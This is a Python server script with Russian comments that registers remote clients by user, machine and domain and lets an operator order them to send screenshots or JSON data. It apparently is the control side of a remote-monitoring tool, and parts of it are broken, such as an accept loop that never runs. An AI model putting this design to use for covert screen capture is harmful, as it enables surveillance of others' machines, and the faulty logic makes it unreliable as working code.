
import socket
import threading
import json
import time
import datetime

# Хост и порт, на котором будет работать сервер
HOST = '127.0.0.1'
PORT = 8085

clients = {}  # Список подключенных клиентов
running = True  # Контроль состояния сервера


def list_clients():

    print("Список всех подключенных клиентов:")
    for addr, client_info in clients.items():
        client_info['time'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") if client_info['active'] else client_info['time']
        print(f" IP: {client_info['ip']}\n Порт: {client_info['port']}\n"
              f" Машина: {client_info['machine']}\n Пользователь: {client_info['user']}\n"
              f" Домен: {client_info['domain']}\n Последняя активность клиента: {client_info['time']}\n ") ##!!



def receive_and_save_bmp(client_socket, file_name):
    try:
        with open(file_name, 'wb') as file:
            # Принимаем данные заголовка BMP файла
            bmp_header = client_socket.recv(54)
            if len(bmp_header) != 54:
                print("Ошибка: Не удалось получить заголовок BMP файла.")
                return

            file.write(bmp_header)

            # Извлекаем информацию о размере файла из заголовка
            file_size = int.from_bytes(bmp_header[2:6], byteorder='little')

            # Принимаем и записываем остальные данные файла
            remaining_data = file_size - 54
            while remaining_data > 0:
                data = client_socket.recv(min(1024, remaining_data))
                if not data:
                    break
                file.write(data)
                remaining_data -= len(data)

            print(f"Файл '{file_name}' успешно принят и сохранен.")
    except Exception as e:
        print(f"Произошла ошибка при приеме файла: {str(e)}")


def control_time_client(client_socket, addr):
    try:
        while True:
            client_socket.send(b'')
            time.sleep(1)
    except (ConnectionResetError, ConnectionAbortedError):
        client_info = clients[addr]
        client_info['active'] = False
        client_info['time'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        #client_info = clients.pop(addr)
        print(f"\nКлиент {addr} был отключен в {client_info['time']}.")
    client_socket.close()

def get_user_info(client_socket):
    info = client_socket.recv(1024).decode()
    try:
        username, machine, domain = info.split()
        return username, machine, domain
    except Exception as e:
        print(f"Произошла ошибка: {str(e)}")

        return info.split(), "Unknoew"

# Первое распараллеливание: принимаем новых клиентов
def accept_clients(server_socket):
    global running
    while True and running == False  :
        try:
            # Получаем уникальный идентификатор клиента: IP-адрес и порт
            client_socket, addr = server_socket.accept()
            username, machine, domain = get_user_info(client_socket)

            client_info = {
                "ip": addr[0],          # IP-адрес клиента
                "port": addr[1],        # Порт клиента
                "user": username,      # Имя пользователя (может быть определено дополнительно)
                "machine": machine,  # Информация о машине (может быть определена дополнительно)
                "domain": domain,      # Имя пользователя (может быть определено дополнительно)
                "time": "Unknoew",
                "active": True,
                "socket": client_socket
            }
            clients[addr] = client_info
            client_thread = threading.Thread(target=control_time_client, args=(client_socket, addr))
            client_thread.start()


        except Exception as e:
            print(f"Произошла ошибка при подключении клиента: {str(e)}")


# Второе распараллеливание: отправляем данные клиентам
def get_data():
    global running
    while True and  running !=False:
        command = input("Введите команду (screenshot [ip] [clientId], json [ip] [clientId], или view , или exit для выхода ): ")
        if command == "view":
            list_clients()
            continue
        elif command == "exit":
            running = False
            print("Завершение работы сервера...")
            # break
        parts = command.split()
        if len(parts) == 3:
            try:
                message = parts[0]
                ip = parts[1]
                client_id = int(parts[2])
                if client_id >= 0 and len(message) > 0:
                    # Проверяем, активен ли клиент
                    if clients[(ip, client_id)]['active']:
                        clients[(ip, client_id)]['socket'].send(message.encode())

                        if message == 'screenshot':
                            receive_and_save_bmp(clients[(ip, client_id)]['socket'], ip+".bmp")

                        # Принимаем JSON файл
                        if message == 'json':
                            json_data = clients[(ip, client_id)]['socket'].recv(40960)
                            parsed_json = json.loads(json_data.decode('utf-8'))
                            print("Принят JSON файл:")
                            print(parsed_json)

                            filename = "received_data.json"
                            with open(filename, 'w') as file:
                                json.dump(parsed_json, file)
                    else:
                        print(f"Клиент {ip}:{client_id} неактивен.")

                else:
                    print("Неправильные данные клиента")
            except ValueError:
                print("Неправильный формат команды")
            except json.JSONDecodeError:
                print("Ошибка при разборе JSON файла")
            except KeyError:
                print(f"Клиент {ip}:{client_id} не найден.")
        else:
            print("Неправильный формат команды")


def main():
    global HOST, PORT, running
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen()
    print(f"Сервер слушает на {HOST}:{PORT}")

    accept_thread = threading.Thread(target=accept_clients, args=(server_socket,))
    send_thread = threading.Thread(target=get_data)

    accept_thread.start()
    send_thread.start()
    # accept_thread.join()  # Дожидаемся завершения потока accept_thread
    # send_thread.join()   # Дожидаемся завершения потока send_thread

    # try:
    #     while running:
    #         time.sleep(0.1)
    # except KeyboardInterrupt:
    #     print("Принудительное завершение работы сервера...")

    # Закрытие всех клиентских сокетов
    # if running== False:
    #     for addr, client_info in clients.items():
    #         client_info['socket'].close()
    #     server_socket.close()
    #     print("Сервер успешно завершен.")

if __name__ == "__main__":
    main()
